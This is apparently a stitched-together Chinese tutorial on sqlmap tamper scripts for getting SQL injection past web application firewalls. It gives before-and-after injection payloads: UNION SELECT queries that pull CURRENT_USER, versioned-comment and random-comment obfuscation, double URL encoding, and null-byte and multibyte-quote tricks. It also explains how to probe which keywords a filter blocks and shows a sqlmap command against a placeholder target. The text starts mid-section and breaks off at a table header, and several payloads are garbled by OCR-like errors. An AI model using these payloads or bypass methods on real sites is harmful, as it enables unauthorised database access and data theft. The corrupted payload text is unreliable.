UNION ALL SELECT NULL, NULL, CONCAT (CHAR (58, 104, 116, 116, 58) , IFNULL (CAST (CURRENT USER () AS CHAR) , CHAR (32)), CH/\*\*/AR (58, 100, 114, 117, 58) ) #

使用脚本后，语句为：

/\*! UNION\*\*! ALL\*! SELECT\*\*! NULL7, /\*! NULL7, CONCAT (CHAR (58, 104, 116, 116, 58) , IFNULL (CAST (CURRENT USER () /\*! AS\*\*! CHAR\*/) , CHAR (32) ) , CHAR (58, 100, 114, 117, 58) ) #

###  halfversionedmorekeywords.py

作用：当数据库为MySQL时绕过防火墙，在每个关键字之前添加MySQL版本 注释。

使用脚本前的语句为：

value' UNION ALL SELECT CONCAT (CHAR (58, 107, 112, 113, 58) , IFNULL (CAST (CURRENT USER () AS CHAR) , CHAR (32) ) , CHAR (58, 97, 110, 121, 58) ) , NULL, NULL# AND 'QDWa^'QDWa

使用脚本后，语句为：

value'/\*! 0UNION/\*! OALL/\*! OS ELECT/\*! 0CONCAT (/\*! 0CHAR (58, 107, 112, 113, 58) , /\*! OIFN ULL (CAST (/\*! OCURRENT USER () / \*! OAS/\*! OCHAR) , /\*! OCHAR (32) ) , /\*! OCHAR (58, 97, 110, 121, 5 8) ) , /\*! ONULL, /\*! ONULL#/\*! 0AND'QDWa'='QDWa

测试通过的数据库类型和版本为MySQL 4.0.18和MySQL 5.0.22。

###  space2morehash.py

作用：将空格替换为#号，并添加T随机字符串和换行符。

使用脚本前的语句为：

1 AND 9227=9227

使用脚本后，语句为：

1 %23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23 lujYFWfv %0A9227=9227

测试通过的数据库类型和版本为MySQL 5.1.41。

###  apostrophenullencode.py

作用：用非法双字节Unicode字符替换单引号。

使用脚本前的语句为：

1 ANDT='1

使用脚本后，语句为：

1 AND %00%271%00%27=%00%271

###  appendnullbyte.py

作用：在有效负荷的结束位置加载零字节字符编码。

使用脚本前的语句为：

1 AND 1=1

使用脚本后，语句为：

1 AND 1=1 %00

###  chardoubleencode.py

作用：对给定的Pay load全部字符使用双重URL编码（不处理已经编码的字 待）。

使用脚本前的语句为：

SELECT FIELD FROM%20TABLE

使用脚本后，语句为：

%2553%2545%254c

%2545%2543%2554%2520%2546%2549%2545%254c

%2544%2520%2546%2552%25 4f%254d%2520%2554%2541 %2542%254c %2545

###  unmagicquotes.py

作用：用一个多字节组合（％bf%27）和末尾通用注释一起替换空格。

使用脚本前的语句为：

1' AND 1=1

使用脚本后，语句为：

1%bf%27-

###  randomcomments.py

作用：用/\*\*/分割SQL关键字。

使用脚本前的语句为：

INSERT

使用脚本后，语句为：

IN/\*\*/s/\*\*/ERT

虽然SQLMap自带的tamper可以做很多事情，但在实际环境中，往往比较复杂，可能会遇到很多情况，tamper不可能很全面地应对各种环境，所以建议读者在学 习如何使用自带的tamper的同时，最好能够掌握tamper的编写规则，这样在应对各种实战环境时才能更自如。




# waf


每当注入的时候看到这个贱贱的提示框，内心有千万只草泥马在奔腾。

[![sqlmap的tamper绕过waf](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20170130160739070%3Fwatermark%2F2%2Ftext%2FaHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2hhdGRheQ%3D%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70%2Fgravity%2FCenter)](http://www.vuln.cn/wp-content/uploads/2015/09/tamper.png)

[![sqlmap的tamper绕过waf](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20170130160759664%3Fwatermark%2F2%2Ftext%2FaHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2hhdGRheQ%3D%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70%2Fgravity%2FCenter)](http://www.vuln.cn/wp-content/uploads/2015/09/tamper1.png)

但很多时候还是得静下来分析过滤系统到底过滤了哪些参数，该如何绕过。

[sqlmap](https://so.csdn.net/so/search?q=sqlmap&spm=1001.2101.3001.7020)中的tamper给我们带来了很多防过滤的脚本，非常实用，可能有的朋友还不知道怎样才能最有效的利用tamper脚本。

当然使用脚本之前需要确定的就是系统过滤了哪些关键字，比如单引号、空格、select、union、admin等等。

所以有的时候我们会发现，注入成功了但是dump不出数据，很可能是select被过滤了等等原因。

### 如何判断使用哪个脚本

最简单的办法就是在url参数中手工带入关键词，判断是否被过滤。

如图：

直接加个单引号被过滤，说明注入时单引号是没法用的。

[![sqlmap的tamper绕过waf](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20170130160822680%3Fwatermark%2F2%2Ftext%2FaHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2hhdGRheQ%3D%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70%2Fgravity%2FCenter)](http://www.vuln.cn/wp-content/uploads/2015/09/tamper2.png)

空格、等于号都没有过滤，成功报错。

[![sqlmap的tamper绕过waf](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20170130160846868%3Fwatermark%2F2%2Ftext%2FaHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2hhdGRheQ%3D%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70%2Fgravity%2FCenter)](http://www.vuln.cn/wp-content/uploads/2015/09/tamper3.png)

select被过滤。

[![sqlmap的tamper绕过waf](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20170130160913540%3Fwatermark%2F2%2Ftext%2FaHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2hhdGRheQ%3D%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70%2Fgravity%2FCenter)](http://www.vuln.cn/wp-content/uploads/2015/09/tamper4.png)以此类推，当sqlmap注入出现问题时，比如不出数据，就要检查对应的关键词是否被过滤。

比如空格被过滤可以使用space2comment.py，过滤系统对大小写敏感可以使用randomcase.py等等。

下面对于sqlmap的tamper参数详细讲解。

### 使用方法

根据实际情况，可以同时使用多个脚本，使用-v参数可以看到payload的变化。

[![sqlmap的tamper绕过waf](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20170130160937321%3Fwatermark%2F2%2Ftext%2FaHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2hhdGRheQ%3D%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70%2Fgravity%2FCenter)](http://www.vuln.cn/wp-content/uploads/2015/09/tamper11.jpg)

> sqlmap.py -u "http://www.target.com/test.php?id=12" --dbms mysql --tamper "space2comment,versionedmorekeywords.py" -v 3 --dbs

### 脚本分类说明


支持的数据库 |编号|脚本名称

